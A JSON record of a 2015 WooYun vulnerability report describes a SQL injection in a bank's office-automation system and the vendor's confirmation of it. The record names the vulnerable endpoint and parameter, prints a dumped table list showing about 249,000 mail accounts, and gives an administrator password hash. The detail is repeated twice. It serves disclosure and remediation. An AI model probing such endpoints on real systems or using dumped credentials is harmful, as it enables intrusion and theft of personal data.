{"id": 82752, "wybug_id": "wooyun-2015-0150064", "wybug_title": "某银行系统存在高危SQL注入漏洞(24W邮箱泄露)", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "路人甲", "wybug_date": "2015-10-28 21:58", "wybug_open_date": "2015-12-14 17:50", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-28：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-11-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-14：\t细节向公众公开  简要描述： RT 详细说明：  01# 起源http://**.**.**.**/bugs/wooyun-2015-013479602# SQL注入点**.**.**.**:7001/defaultroot/InfoViewIframeAction.do?historyId=1&action=delHistory24W＋邮箱账户\nDatabase: oa+-----------------------------------------+---------+| Table                                   | Entries |+-----------------------------------------+---------+| ezoffice.oa_informationStatistics       | 268797  || ezoffice.OA_MAIL_USER                   | 249308  || ezoffice.OA_INFORMATIONBROWSER          | 150039  || ezoffice.WF_SEQUENCE                    | 127574  || ezoffice.GOV_SENDFILE_USER              | 65894   || ezoffice.MS_INFOLIST                    | 54177   || ezoffice.OA_ALLATTACH                   | 42203   || ezoffice.OA_MAILINTERIOR                | 41061   || ezoffice.OA_MAILACCESSORY               | 36696   || ezoffice.WF_DEALWITHLOG                 | 23262   || ezoffice.WF_PROCEEDACTIVITY             | 15842   || ezoffice.WF_PROCEEDTRANSITION           | 15305   || ezoffice.WF_PROCEEDTRANSITION           | 15305   || ezoffice.WF_DEALWITHCOMMENT             | 10500   || ezoffice.WF_DEALWITHCOMMENT             | 10500   || ezoffice.zl_user_info                   | 5301    || ezoffice.oa_informationLuceneTemp       | 4188    || ezoffice.GOV_senddocumentUpdate         | 3163    || ezoffice.OA_DISTRICT                    | 2476    || ezoffice.OA_PERSONOA_USER_PRESS_RELATIO | 2213    || ezoffice.wf_proceedflow                 | 2168    || ezoffice.OA_INFORMATIONACCESSORY        | 2033    || ezoffice.GOV_RECEIVEFILE                | 1676    || ezoffice.ORG_SYNCRTX                    | 1413    || ezoffice.OA_PASSWORD_HISTORY            | 1286    || ezoffice.ORG_RIGHTSCOPE                 | 1197    || dbo.oldid                               | 1148    || ezoffice.OA_INFORHISTORYACCESSORY       | 1087    || ezoffice.OA_PERSONOA_PRESS              | 977     || ezoffice.zl_org_info                    | 873     || ezoffice.OA_INFORMATIONHISTORY          | 869     || ezoffice.tManager                       | 499     || ezoffice.ORG_ORGANIZATION_USER          | 496     || ezoffice.ORG_ORGANIZATION_USER          | 496     || ezoffice.OA_SYSTEM_REMIND               | 490     || ezoffice.WF_READWRITECONTROL            | 482     || ezoffice.Document_File                  | 426     || ezoffice.employee_20131211101505user    | 391     || **.**.**.**_20131211101505user         | 391     || ezoffice.WF_IMMOBILITYFIELD             | 376     || ezoffice.OA_INFORPERSONALSTAT           | 351     || ezoffice.WEIBO_USER                     | 314     || ezoffice.employee_20131211101505scope   | 297     || ezoffice.GOV_DOCUMENTSENDFILE           | 238     || ezoffice.OA_INFORORGSTAT                | 198     || ezoffice.ORG_RIGHT                      | 198     || ezoffice.HR_RPT_INIT_FIELD              | 177     || ezoffice.GOV_CUSTOM_CHECKFIELD          | 164     || ezoffice.ORG_USER_GROUP                 | 144     || ezoffice.oa_patchinfo                   | 131     || ezoffice.ORG_ROLE_RIGHT                 | 127     || ezoffice.ORG_USER_ROLE                  | 114     || ezoffice.oa_logoin_errornumpass         | 101     || ezoffice.tElt                           | 88      || ezoffice.GOV_CUSTOM_FIELD               | 87      || ezoffice.tField                         | 70      || ezoffice.OA_MENUSET                     | 69      || ezoffice.gov_wflowResave                | 67      || ezoffice.BookMarks                      | 64      || ezoffice.tShow                          | 61      || ezoffice.WF_ACTIVITY                    | 60      || **.**.**.**_20131211101505             | 59      || ezoffice.OA_OFFICALDICTION              | 58      || ezoffice.WF_TRANSITION                  | 54      || ezoffice.SECURITY_LOG_MODULE            | 51      || ezoffice.SECURITY_LOG_MODULE            | 51      || ezoffice.WF_TRANSITIONRESTRICTION       | 49      || ezoffice.MS_INFODESCRIBE                | 48      || ezoffice.SECURITY_ONLINEUSER            | 45      || ezoffice.oa_portal_portlet_setting      | 44      || ezoffice.WF_PACKAGE                     | 43      || ezoffice.WF_NEEDFLOWMODULE              | 42      || ezoffice.WF_IMMOBILITYFORM              | 41      || ezoffice.OA_INFORMATIONCHANNEL          | 34      || ezoffice.WF_WORK_ACCESSORY              | 34      || ezoffice.WF_WORK_ACCESSORY              | 34      || ezoffice.OA_PERSONONDUTY                | 32      || ezoffice.CUSTOMER_CENTER                | 26      || ezoffice.OA_INFORMATIONCOMMENT          | 25      || ezoffice.WF_OA_RELATEFIELD              | 22      || ezoffice.tSign                          | 19      || ezoffice.MS_COUNT                       | 16      || ezoffice.GOV_senddocumentTopical        | 15      || ezoffice.OA_DIARYCLASS                  | 15      || ezoffice.OA_DIARYCLASS                  | 15      || ezoffice.tArea                          | 14      || ezoffice.tPage                          | 14      || ezoffice.WF_WORKFLOWWRITECONTROL        | 14      || ezoffice.GOV_SENDFILECHECKWITHWF_ACC    | 12      || ezoffice.whir$t3008                     | 12      || ezoffice.GOV_SENDFILECHECKWITHWORKFLOW  | 11      || ezoffice.OA_PERSONALSTAT                | 11      || **.**.**.**_tmppassword                | 11      || ezoffice.tTable                         | 11      || ezoffice.employee_20131211101505role    | 10      || ezoffice.GOV_documentUnit               | 10      || ezoffice.gov_ReceiveFileSeq             | 10      || ezoffice.MS_MODEL                       | 10      || ezoffice.oa_portal_type                 | 10      || ezoffice.Template_BookMarks             | 10      || ezoffice.Template_BookMarks             | 10      || ezoffice.employee_20131211101505group   | 9       || ezoffice.employee_20131211101505group   | 9       || ezoffice.HR_S_INCOME_TAX                | 9       || ezoffice.oa_ext_table                   | 9       || ezoffice.oa_graphreport_type            | 9       || ezoffice.oa_graphreport_type            | 9       || ezoffice.oa_portal_template             | 9       || ezoffice.tAreatype                      | 9       || ezoffice.wf_oldCommentlog               | 9       || ezoffice.WF_WORKFLOW_DESIGNER           | 9       || ezoffice.WF_WORKFLOWPROCESS             | 9       || ezoffice.HR_S_RATIO_SETTING             | 8       || ezoffice.OA_EMPLOYEE_STATUS             | 8       || ezoffice.oa_informationStatisticsType   | 8       || ezoffice.oa_maturity_alert_settings     | 8       || ezoffice.OA_RELATIONMODULE              | 8       || **.**.**.**_LoginPageSetTab            | 8       || ezoffice.oa_ext_show                    | 7       || ezoffice.OA_RELATIONOBJECT              | 7       || ezoffice.whir$t3011                     | 7       || ezoffice.oa_portal_layout_portlet       | 6       || ezoffice.oa_portal_layout_portlet       | 6       || ezoffice.GOV_CUSTOM_DOCUMNET            | 5       || ezoffice.gov_senddocumentNum            | 5       || ezoffice.gov_senddocumentword           | 5       || ezoffice.OA_DEPARTMENTSTYLE             | 5       || ezoffice.whir$t3009                     | 5       || ezoffice.hr_kq_type                     | 4       || ezoffice.oa_ext_type                    | 4       || ezoffice.OA_STATUS_DETAIL               | 4       || ezoffice.tModel                         | 4       || ezoffice.tType                          | 4       || ezoffice.EZ_FLOW_GE_PROPERTY            | 3       || ezoffice.OA_DOSSIER_GDSET               | 3       || ezoffice.OA_EDITION                     | 3       || ezoffice.oa_interface_setting           | 3       || ezoffice.OA_MAIL_USERSET                | 3       || ezoffice.SFT_XXBS_JFBZSZ                | 3       || ezoffice.Template_File                  | 3       || ezoffice.tSession                       | 3       || ezoffice.UNION_TASKFROM                 | 3       || ezoffice.OA_CARDEMPINFO                 | 2       || ezoffice.OA_INFORMATION_Department_XMl  | 2       || ezoffice.OA_INFORMATION_Department_XMl  | 2       || ezoffice.OA_MAILUSERBOX                 | 2       || ezoffice.OA_NOTEPAPER                   | 2       || ezoffice.OA_ORGWRAP                     | 2       || ezoffice.oa_taskView                    | 2       || ezoffice.tCode                          | 2       || ezoffice.tSeq                           | 2       || ezoffice.DOCUMENT_EXT                   | 1       || ezoffice.DOCUMENT_EXT                   | 1       || ezoffice.EZ_FLOW_RE_MYAUTOTRAN          | 1       || ezoffice.EZ_FLOW_RU_EXECUTION           | 1       || ezoffice.ez_form_module                 | 1       || ezoffice.GOV_receivedocumentBASEINFO    | 1       || ezoffice.GOV_senddocumentBASEINFO       | 1       || ezoffice.hr_s_fffs_setting              | 1       || ezoffice.OA_CUSTOMDESKTOPLAYOUT         | 1       || ezoffice.OA_DUTY                        | 1       || ezoffice.OA_EVENTATTENDER               | 1       || ezoffice.OA_MAIL_H_SET                  | 1       || ezoffice.OA_PERSONSETUP                 | 1       || ezoffice.oa_portal_menu_setting         | 1       || ezoffice.oa_portal_menu_setting         | 1       || ezoffice.OA_SEQ                         | 1       || ezoffice.oa_sys_mailremind              | 1       || ezoffice.OA_UNITINFO                    | 1       || ezoffice.oa_wf_overdate                 | 1       || ezoffice.ORG_DOMAIN                     | 1       || **.**.**.**_group_class                | 1       || **.**.**.**_group_class                | 1       || ezoffice.ORG_MANAGER                    | 1       || **.**.**.**_role_class                 | 1       || **.**.**.**_role_class                 | 1       || ezoffice.SECURITY_DOG                   | 1       || ezoffice.SECURITY_IP                    | 1       || ezoffice.WEIBO_COMMENT                  | 1       || ezoffice.WEIBO_FAVORITE                 | 1       |+-----------------------------------------+---------+\n系统管理员：\nback-end DBMS: Microsoft SQL Server 2008Database: oaTable: ezoffice.tManager[1 entry]+------------+------------+-------------+-------------+----------------------------------+--------------+--------------+---------------+| manager_id | manager_zh | manager_tel | manager_org | manager_pwd                      | manager_code | manager_name | manager_email |+------------+------------+-------------+-------------+----------------------------------+--------------+--------------+---------------+| 0          | admin      | <blank>     | NULL        | 2EFE9E90C1D62B4171F575FB4EAF4966 | NULL         | 系统管理员        | <blank>       |+------------+------------+-------------+-------------+----------------------------------+--------------+--------------+---------------+\n   漏洞证明：  01# 起源http://**.**.**.**/bugs/wooyun-2015-013479602# SQL注入点**.**.**.**:7001/defaultroot/InfoViewIframeAction.do?historyId=1&action=delHistory24W＋邮箱账户\nDatabase: oa+-----------------------------------------+---------+| Table                                   | Entries |+-----------------------------------------+---------+| ezoffice.oa_informationStatistics       | 268797  || ezoffice.OA_MAIL_USER                   | 249308  || ezoffice.OA_INFORMATIONBROWSER          | 150039  || ezoffice.WF_SEQUENCE                    | 127574  || ezoffice.GOV_SENDFILE_USER              | 65894   || ezoffice.MS_INFOLIST                    | 54177   || ezoffice.OA_ALLATTACH                   | 42203   || ezoffice.OA_MAILINTERIOR                | 41061   || ezoffice.OA_MAILACCESSORY               | 36696   || ezoffice.WF_DEALWITHLOG                 | 23262   || ezoffice.WF_PROCEEDACTIVITY             | 15842   || ezoffice.WF_PROCEEDTRANSITION           | 15305   || ezoffice.WF_PROCEEDTRANSITION           | 15305   || ezoffice.WF_DEALWITHCOMMENT             | 10500   || ezoffice.WF_DEALWITHCOMMENT             | 10500   || ezoffice.zl_user_info                   | 5301    || ezoffice.oa_informationLuceneTemp       | 4188    || ezoffice.GOV_senddocumentUpdate         | 3163    || ezoffice.OA_DISTRICT                    | 2476    || ezoffice.OA_PERSONOA_USER_PRESS_RELATIO | 2213    || ezoffice.wf_proceedflow                 | 2168    || ezoffice.OA_INFORMATIONACCESSORY        | 2033    || ezoffice.GOV_RECEIVEFILE                | 1676    || ezoffice.ORG_SYNCRTX                    | 1413    || ezoffice.OA_PASSWORD_HISTORY            | 1286    || ezoffice.ORG_RIGHTSCOPE                 | 1197    || dbo.oldid                               | 1148    || ezoffice.OA_INFORHISTORYACCESSORY       | 1087    || ezoffice.OA_PERSONOA_PRESS              | 977     || ezoffice.zl_org_info                    | 873     || ezoffice.OA_INFORMATIONHISTORY          | 869     || ezoffice.tManager                       | 499     || ezoffice.ORG_ORGANIZATION_USER          | 496     || ezoffice.ORG_ORGANIZATION_USER          | 496     || ezoffice.OA_SYSTEM_REMIND               | 490     || ezoffice.WF_READWRITECONTROL            | 482     || ezoffice.Document_File                  | 426     || ezoffice.employee_20131211101505user    | 391     || **.**.**.**_20131211101505user         | 391     || ezoffice.WF_IMMOBILITYFIELD             | 376     || ezoffice.OA_INFORPERSONALSTAT           | 351     || ezoffice.WEIBO_USER                     | 314     || ezoffice.employee_20131211101505scope   | 297     || ezoffice.GOV_DOCUMENTSENDFILE           | 238     || ezoffice.OA_INFORORGSTAT                | 198     || ezoffice.ORG_RIGHT                      | 198     || ezoffice.HR_RPT_INIT_FIELD              | 177     || ezoffice.GOV_CUSTOM_CHECKFIELD          | 164     || ezoffice.ORG_USER_GROUP                 | 144     || ezoffice.oa_patchinfo                   | 131     || ezoffice.ORG_ROLE_RIGHT                 | 127     || ezoffice.ORG_USER_ROLE                  | 114     || ezoffice.oa_logoin_errornumpass         | 101     || ezoffice.tElt                           | 88      || ezoffice.GOV_CUSTOM_FIELD               | 87      || ezoffice.tField                         | 70      || ezoffice.OA_MENUSET                     | 69      || ezoffice.gov_wflowResave                | 67      || ezoffice.BookMarks                      | 64      || ezoffice.tShow                          | 61      || ezoffice.WF_ACTIVITY                    | 60      || **.**.**.**_20131211101505             | 59      || ezoffice.OA_OFFICALDICTION              | 58      || ezoffice.WF_TRANSITION                  | 54      || ezoffice.SECURITY_LOG_MODULE            | 51      || ezoffice.SECURITY_LOG_MODULE            | 51      || ezoffice.WF_TRANSITIONRESTRICTION       | 49      || ezoffice.MS_INFODESCRIBE                | 48      || ezoffice.SECURITY_ONLINEUSER            | 45      || ezoffice.oa_portal_portlet_setting      | 44      || ezoffice.WF_PACKAGE                     | 43      || ezoffice.WF_NEEDFLOWMODULE              | 42      || ezoffice.WF_IMMOBILITYFORM              | 41      || ezoffice.OA_INFORMATIONCHANNEL          | 34      || ezoffice.WF_WORK_ACCESSORY              | 34      || ezoffice.WF_WORK_ACCESSORY              | 34      || ezoffice.OA_PERSONONDUTY                | 32      || ezoffice.CUSTOMER_CENTER                | 26      || ezoffice.OA_INFORMATIONCOMMENT          | 25      || ezoffice.WF_OA_RELATEFIELD              | 22      || ezoffice.tSign                          | 19      || ezoffice.MS_COUNT                       | 16      || ezoffice.GOV_senddocumentTopical        | 15      || ezoffice.OA_DIARYCLASS                  | 15      || ezoffice.OA_DIARYCLASS                  | 15      || ezoffice.tArea                          | 14      || ezoffice.tPage                          | 14      || ezoffice.WF_WORKFLOWWRITECONTROL        | 14      || ezoffice.GOV_SENDFILECHECKWITHWF_ACC    | 12      || ezoffice.whir$t3008                     | 12      || ezoffice.GOV_SENDFILECHECKWITHWORKFLOW  | 11      || ezoffice.OA_PERSONALSTAT                | 11      || **.**.**.**_tmppassword                | 11      || ezoffice.tTable                         | 11      || ezoffice.employee_20131211101505role    | 10      || ezoffice.GOV_documentUnit               | 10      || ezoffice.gov_ReceiveFileSeq             | 10      || ezoffice.MS_MODEL                       | 10      || ezoffice.oa_portal_type                 | 10      || ezoffice.Template_BookMarks             | 10      || ezoffice.Template_BookMarks             | 10      || ezoffice.employee_20131211101505group   | 9       || ezoffice.employee_20131211101505group   | 9       || ezoffice.HR_S_INCOME_TAX                | 9       || ezoffice.oa_ext_table                   | 9       || ezoffice.oa_graphreport_type            | 9       || ezoffice.oa_graphreport_type            | 9       || ezoffice.oa_portal_template             | 9       || ezoffice.tAreatype                      | 9       || ezoffice.wf_oldCommentlog               | 9       || ezoffice.WF_WORKFLOW_DESIGNER           | 9       || ezoffice.WF_WORKFLOWPROCESS             | 9       || ezoffice.HR_S_RATIO_SETTING             | 8       || ezoffice.OA_EMPLOYEE_STATUS             | 8       || ezoffice.oa_informationStatisticsType   | 8       || ezoffice.oa_maturity_alert_settings     | 8       || ezoffice.OA_RELATIONMODULE              | 8       || **.**.**.**_LoginPageSetTab            | 8       || ezoffice.oa_ext_show                    | 7       || ezoffice.OA_RELATIONOBJECT              | 7       || ezoffice.whir$t3011                     | 7       || ezoffice.oa_portal_layout_portlet       | 6       || ezoffice.oa_portal_layout_portlet       | 6       || ezoffice.GOV_CUSTOM_DOCUMNET            | 5       || ezoffice.gov_senddocumentNum            | 5       || ezoffice.gov_senddocumentword           | 5       || ezoffice.OA_DEPARTMENTSTYLE             | 5       || ezoffice.whir$t3009                     | 5       || ezoffice.hr_kq_type                     | 4       || ezoffice.oa_ext_type                    | 4       || ezoffice.OA_STATUS_DETAIL               | 4       || ezoffice.tModel                         | 4       || ezoffice.tType                          | 4       || ezoffice.EZ_FLOW_GE_PROPERTY            | 3       || ezoffice.OA_DOSSIER_GDSET               | 3       || ezoffice.OA_EDITION                     | 3       || ezoffice.oa_interface_setting           | 3       || ezoffice.OA_MAIL_USERSET                | 3       || ezoffice.SFT_XXBS_JFBZSZ                | 3       || ezoffice.Template_File                  | 3       || ezoffice.tSession                       | 3       || ezoffice.UNION_TASKFROM                 | 3       || ezoffice.OA_CARDEMPINFO                 | 2       || ezoffice.OA_INFORMATION_Department_XMl  | 2       || ezoffice.OA_INFORMATION_Department_XMl  | 2       || ezoffice.OA_MAILUSERBOX                 | 2       || ezoffice.OA_NOTEPAPER                   | 2       || ezoffice.OA_ORGWRAP                     | 2       || ezoffice.oa_taskView                    | 2       || ezoffice.tCode                          | 2       || ezoffice.tSeq                           | 2       || ezoffice.DOCUMENT_EXT                   | 1       || ezoffice.DOCUMENT_EXT                   | 1       || ezoffice.EZ_FLOW_RE_MYAUTOTRAN          | 1       || ezoffice.EZ_FLOW_RU_EXECUTION           | 1       || ezoffice.ez_form_module                 | 1       || ezoffice.GOV_receivedocumentBASEINFO    | 1       || ezoffice.GOV_senddocumentBASEINFO       | 1       || ezoffice.hr_s_fffs_setting              | 1       || ezoffice.OA_CUSTOMDESKTOPLAYOUT         | 1       || ezoffice.OA_DUTY                        | 1       || ezoffice.OA_EVENTATTENDER               | 1       || ezoffice.OA_MAIL_H_SET                  | 1       || ezoffice.OA_PERSONSETUP                 | 1       || ezoffice.oa_portal_menu_setting         | 1       || ezoffice.oa_portal_menu_setting         | 1       || ezoffice.OA_SEQ                         | 1       || ezoffice.oa_sys_mailremind              | 1       || ezoffice.OA_UNITINFO                    | 1       || ezoffice.oa_wf_overdate                 | 1       || ezoffice.ORG_DOMAIN                     | 1       || **.**.**.**_group_class                | 1       || **.**.**.**_group_class                | 1       || ezoffice.ORG_MANAGER                    | 1       || **.**.**.**_role_class                 | 1       || **.**.**.**_role_class                 | 1       || ezoffice.SECURITY_DOG                   | 1       || ezoffice.SECURITY_IP                    | 1       || ezoffice.WEIBO_COMMENT                  | 1       || ezoffice.WEIBO_FAVORITE                 | 1       |+-----------------------------------------+---------+\n系统管理员：\nback-end DBMS: Microsoft SQL Server 2008Database: oaTable: ezoffice.tManager[1 entry]+------------+------------+-------------+-------------+----------------------------------+--------------+--------------+---------------+| manager_id | manager_zh | manager_tel | manager_org | manager_pwd                      | manager_code | manager_name | manager_email |+------------+------------+-------------+-------------+----------------------------------+--------------+--------------+---------------+| 0          | admin      | <blank>     | NULL        | 2EFE9E90C1D62B4171F575FB4EAF4966 | NULL         | 系统管理员        | <blank>       |+------------+------------+-------------+-------------+----------------------------------+--------------+--------------+---------------+\n   修复方案：  historyId进行整型转换   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-10-30 17:49 厂商回复： CNVD确认并复现所述情况,已经转由CNCERT向银行业信息化主管部门通报,由其后续协调网站管理单位处置.  最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}